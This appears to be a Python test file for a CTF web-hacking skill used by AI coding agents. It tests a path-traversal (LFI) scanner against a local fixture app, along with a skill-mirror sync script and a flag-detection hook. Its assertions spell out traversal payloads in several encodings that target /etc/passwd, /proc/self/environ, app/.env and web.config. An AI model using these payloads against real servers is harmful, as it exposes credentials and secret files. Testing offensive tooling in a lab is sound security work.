        return url + ("&gate=" + gate if gate else "")

    def test_standard_depth_one_flag_and_anonymous_replay(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full(
                "lfiquick.py", "--url", self.url(), "--token", "fixture-user",
                "--style", "plain", "--max-depth", "2", "--delay", "0",
                "--out", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("FLAG " + fixture_app.LFI_FLAG, proc.stdout)
            self.assertIn("winning traversal prefix: style=plain depth=1", proc.stdout)
            self.assertIn("anonymous replay returned the same flag", proc.stdout)
            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                records = [json.loads(line) for line in fh if line.strip()]
            self.assertEqual(records[0]["label"], "baseline")
            self.assertEqual(records[0]["identity"], "auth")
            self.assertEqual(records[1]["identity"], "anonymous")
            self.assertEqual(records[-1]["label"], "replay:anonymous")
            self.assertEqual(records[-1]["raw_value"], "../flag.txt")

    def test_confirmed_four_dot_depth_is_reused_for_flag_read(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full(
                "lfiquick.py", "--url", self.url("four-dot"),
                "--style", "four-dot", "--max-depth", "2", "--delay", "0",
                "--out", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("CONFIRMED file read: style=four-dot depth=2", proc.stdout)
            self.assertIn("winning traversal prefix: style=four-dot depth=2", proc.stdout)
            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                records = [json.loads(line) for line in fh if line.strip()]
            self.assertEqual(records[-2]["raw_value"], "....//....//etc/passwd")
            self.assertEqual(records[-1]["raw_value"], "....//....//flag.txt")

    def test_double_encoded_wrapper_is_preserved_exactly(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full(
                "lfiquick.py", "--url", self.url("double-encoded"),
                "--style", "double-encoded", "--max-depth", "2", "--delay", "0",
                "--out", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                records = [json.loads(line) for line in fh if line.strip()]
            self.assertEqual(records[-2]["raw_value"], "..%252f..%252fetc/passwd")
            self.assertEqual(records[-1]["raw_value"], "..%252f..%252fflag.txt")
            self.assertIn("%252f", records[-1]["url"])

    def test_flag_in_response_header_is_detected(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full(
                "lfiquick.py", "--url", self.url("header"),
                "--style", "plain", "--max-depth", "1", "--delay", "0",
                "--out", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("FLAG " + fixture_app.LFI_HEADER_FLAG, proc.stdout)
            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                records = [json.loads(line) for line in fh if line.strip()]
            self.assertEqual(records[-1]["headers"]["X-Flag"], fixture_app.LFI_HEADER_FLAG)

    def test_linux_environment_is_swept_with_confirmed_double_slash_dialect(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full(
                "lfiquick.py", "--url", self.url("linux-env"),
                "--style", "double-slash", "--max-depth", "2", "--delay", "0",
                "--out", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("CONFIRMED file read: style=double-slash depth=2", proc.stdout)
            self.assertIn("FLAG " + fixture_app.LFI_ENV_FLAG, proc.stdout)
            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                records = [json.loads(line) for line in fh if line.strip()]
            self.assertEqual(records[-1]["raw_value"], "..//..//proc/self/environ")

    def test_windows_signature_drives_config_and_objective_sweep(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full(
                "lfiquick.py", "--url", self.url("windows"),
                "--style", "backslash", "--max-depth", "2", "--delay", "0",
                "--out", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("Windows win.ini signature", proc.stdout)
            self.assertIn("FLAG " + fixture_app.LFI_WINDOWS_FLAG, proc.stdout)
            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                records = [json.loads(line) for line in fh if line.strip()]
            self.assertEqual(
                records[-1]["raw_value"],
                "..\\..\\inetpub\\wwwroot\\web.config")

    def test_seclists_derived_encoded_style_is_preserved_and_reused(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full(
                "lfiquick.py", "--url", self.url("slash-encoded"),
                "--style", "dot-encoded", "--max-depth", "2", "--delay", "0",
                "--out", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("CONFIRMED file read: style=dot-encoded depth=2", proc.stdout)
            self.assertIn("FLAG " + fixture_app.LFI_ENV_FLAG, proc.stdout)
            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                records = [json.loads(line) for line in fh if line.strip()]
            self.assertEqual(
                records[-1]["raw_value"],
                "%2e%2e%2f%2e%2e%2fapp/.env")
            self.assertIn("%2e%2e%2f", records[-1]["url"].lower())

    def test_alternate_signature_recovers_when_passwd_is_filtered(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full(
                "lfiquick.py", "--url", self.url("passwd-blocked"),
                "--style", "plain", "--max-depth", "2", "--delay", "0",
                "--out", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("/proc/self/status signature", proc.stdout)
            self.assertIn("FLAG " + fixture_app.LFI_ENV_FLAG, proc.stdout)
            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                records = [json.loads(line) for line in fh if line.strip()]
            fallback = next(record for record in records
                            if record["label"] == "fallback:plain:proc_self_status")
            self.assertEqual(fallback["raw_value"], "../../proc/self/status")
            self.assertEqual(records[-1]["raw_value"], "../../app/.env")

    def test_extended_profile_is_bounded_separately_from_core(self):
        help_proc = run_full("lfiquick.py", "--help")
        self.assertEqual(help_proc.returncode, 0, help_proc.stdout + help_proc.stderr)
        self.assertIn("128 core, 260 extended", help_proc.stdout)
        self.assertIn("unicode-backslash", help_proc.stdout)

    def test_extended_profile_tries_legacy_suffix_only_at_deepest_depth(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full(
                "lfiquick.py", "--url", self.url("legacy-null"),
                "--profile", "extended", "--style", "plain",
                "--max-depth", "1", "--delay", "0", "--out", tmp)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertIn("FLAG " + fixture_app.LFI_FLAG, proc.stdout)
            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                records = [json.loads(line) for line in fh if line.strip()]
            self.assertEqual(records[-1]["label"], "legacy:plain:flag.txtpct00")
            self.assertEqual(records[-1]["raw_value"], "../flag.txt%00")
            self.assertIn("%00", records[-1]["url"])

    def test_core_matrix_exhausts_within_its_default_budget(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full(
                "lfiquick.py", "--url", self.url("safe"),
                "--profile", "core", "--delay", "0", "--out", tmp)
            self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
            self.assertIn("bounded traversal set found no confirmed file read", proc.stdout)
            self.assertNotIn("probe budget reached", proc.stdout)
            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                records = [json.loads(line) for line in fh if line.strip()]
            self.assertLessEqual(len(records), 128)
            self.assertTrue(any(record["raw_value"] == "C:/Windows/win.ini"
                                for record in records))
            self.assertTrue(any("%252f" in record["raw_value"] for record in records))

    def test_invalid_baseline_stops_before_traversal(self):
        with tempfile.TemporaryDirectory() as tmp:
            proc = run_full(
                "lfiquick.py", "--url", self.url(file_value="/uploads/missing.png"),
                "--style", "plain", "--delay", "0", "--out", tmp)
            self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
            self.assertIn("known-valid baseline did not succeed", proc.stdout)
            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
                self.assertEqual(sum(1 for line in fh if line.strip()), 1)

    def test_rate_limit_and_gateway_are_circuit_breakers(self):
        cases = (("rate", 2, "429 rate limit"),
                 ("gateway", 3, "CIRCUIT BREAKER"))
        for mode, expected_code, marker in cases:
            with self.subTest(mode=mode), tempfile.TemporaryDirectory() as tmp:
                proc = run_full(
                    "lfiquick.py", "--url", self.url(mode),
                    "--style", "plain", "--delay", "0", "--out", tmp)
                self.assertEqual(proc.returncode, expected_code, proc.stdout + proc.stderr)
                self.assertIn(marker, proc.stdout)


@unittest.skipUnless(
    os.path.isdir(os.path.join(os.path.dirname(SCRIPTS), ".git")),
    "mirror generation tests run only from the canonical git checkout")
class ClaudeMirrorSyncRegressionTest(unittest.TestCase):
    """Codex owns the git checkout; Claude receives an atomic platform rendering
    with its own invocation frontmatter, paths, and flag-hook evidence location."""

    def test_rendered_mirror_has_claude_variants_and_detects_drift(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = os.path.join(tmp, "web-ctf")
            backups = os.path.join(tmp, "backups")
            proc = run_full(
                "sync-claude-mirror.py", "--target", target, "--backup-dir", backups)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertFalse(os.path.islink(target))
            self.assertFalse(os.path.exists(os.path.join(target, ".git")))
            self.assertFalse(os.path.exists(os.path.join(target, "agents")))

            with open(os.path.join(target, "SKILL.md"), encoding="utf-8") as fh:
                skill = fh.read()
            self.assertIn("user-invocable: true", skill)
            self.assertIn("# /web-ctf", skill)
            self.assertIn("~/.claude/skills/web-ctf/scripts/lfiquick.py", skill)
            self.assertIn("~/Offsec/Web_CTF/.claude/settings.json", skill)
            self.assertNotIn("~/.codex/skills/web-ctf", skill)

            with open(os.path.join(target, "scripts", "flaghook.py"),
                      encoding="utf-8") as fh:
                hook = fh.read()
            self.assertIn('".claude", "ctf-flags.log"', hook)
            self.assertNotIn('".codex", "ctf-flags.log"', hook)

            clean = run_full(
                "sync-claude-mirror.py", "--target", target, "--backup-dir", backups,
                "--check")
            self.assertEqual(clean.returncode, 0, clean.stdout + clean.stderr)
            with open(os.path.join(target, "SKILL.md"), "a", encoding="utf-8") as fh:
                fh.write("\nmirror drift\n")
            drift = run_full(
                "sync-claude-mirror.py", "--target", target, "--backup-dir", backups,
                "--check")
            self.assertEqual(drift.returncode, 1, drift.stdout + drift.stderr)
            self.assertIn("mirror drift detected", drift.stdout)

    def test_successful_sync_prunes_old_backups_outside_skill_discovery(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = os.path.join(tmp, "skills", "web-ctf")
            backups = os.path.join(tmp, "skill-backups", "web-ctf")
            first = run_full("sync-claude-mirror.py", "--target", target)
            self.assertEqual(first.returncode, 0, first.stdout + first.stderr)

            for stamp in ("20240101T000000Z", "20240201T000000Z", "20240301T000000Z"):
                path = os.path.join(backups, "web-ctf.backup-" + stamp)
                os.makedirs(path)
                with open(os.path.join(path, "marker"), "w", encoding="utf-8") as fh:
                    fh.write(stamp)

            refreshed = run_full("sync-claude-mirror.py", "--target", target)
            self.assertEqual(refreshed.returncode, 0, refreshed.stdout + refreshed.stderr)
            self.assertIn("pruned 2 stale backup(s)", refreshed.stdout)
            self.assertFalse(os.path.exists(os.path.join(
                backups, "web-ctf.backup-20240101T000000Z")))
            self.assertFalse(os.path.exists(os.path.join(
                backups, "web-ctf.backup-20240201T000000Z")))
            self.assertTrue(os.path.isdir(os.path.join(
                backups, "web-ctf.backup-20240301T000000Z")))
            retained = sorted(name for name in os.listdir(backups)
                              if name.startswith("web-ctf.backup-"))
            self.assertEqual(len(retained), 2)
            self.assertFalse(any(name.startswith("web-ctf.backup-")
                                 for name in os.listdir(os.path.dirname(target))))

    def test_failed_sync_leaves_backups_untouched(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = os.path.join(tmp, "skills", "web-ctf")
            backups = os.path.join(tmp, "skill-backups", "web-ctf")
            os.makedirs(backups)
            old_backup = os.path.join(backups, "web-ctf.backup-20240101T000000Z")
            os.makedirs(old_backup)
            os.makedirs(os.path.dirname(target))
            os.symlink(os.path.dirname(SCRIPTS), target)

            refused = run_full("sync-claude-mirror.py", "--target", target)
            self.assertEqual(refused.returncode, 2, refused.stdout + refused.stderr)
            self.assertTrue(os.path.isdir(old_backup))

    def test_initial_canonical_symlink_requires_explicit_handoff(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = os.path.join(tmp, "skills", "web-ctf")
            backups = os.path.join(tmp, "backups")
            os.makedirs(os.path.dirname(target))
            os.symlink(os.path.dirname(SCRIPTS), target)
            refused = run_full(
                "sync-claude-mirror.py", "--target", target, "--backup-dir", backups)
            self.assertEqual(refused.returncode, 2, refused.stdout + refused.stderr)
            self.assertIn("use --replace-symlink", refused.stderr)

            replaced = run_full(
                "sync-claude-mirror.py", "--target", target, "--backup-dir", backups,
                "--replace-symlink")
            self.assertEqual(replaced.returncode, 0, replaced.stdout + replaced.stderr)
            self.assertFalse(os.path.islink(target))
            self.assertIn("previous install preserved", replaced.stdout)


class FlaghookPlaceholderPrefixTest(unittest.TestCase):
    """The placeholder suppressor was hardcoded to flag{}, while FLAG_RE accepts nine
    prefixes. Writing `bug{...}` into a worklog documenting the wrapper therefore
    hard-blocked a turn with "REPORT THIS FLAG TO THE USER" -- a false positive that
    costs a turn and risks a fabricated flag report."""

    def hook(self, text):
        with tempfile.TemporaryDirectory() as tmp:
            return run_full("flaghook.py", input_text=text, env={"HOME": tmp}).returncode

    def test_placeholders_are_suppressed_for_every_prefix(self):
        for placeholder in ("bug{...}", "HTB{example}", "picoCTF{your_flag_here}",
                            "flag{...}", "CTF{placeholder}"):
            self.assertEqual(self.hook("wrapper is %s here" % placeholder), 0,
                             "%s should be suppressed as a placeholder" % placeholder)

    def test_real_flags_still_fire(self):
        for real in ("bug{gbnb4bjCPi7k95g4xbL6ONdvkmJ4SHQX}", "HTB{a1b2c3d4e5f6}"):
            self.assertEqual(self.hook(real), 2, "%s must still be reported" % real)


if __name__ == "__main__":
    unittest.main()
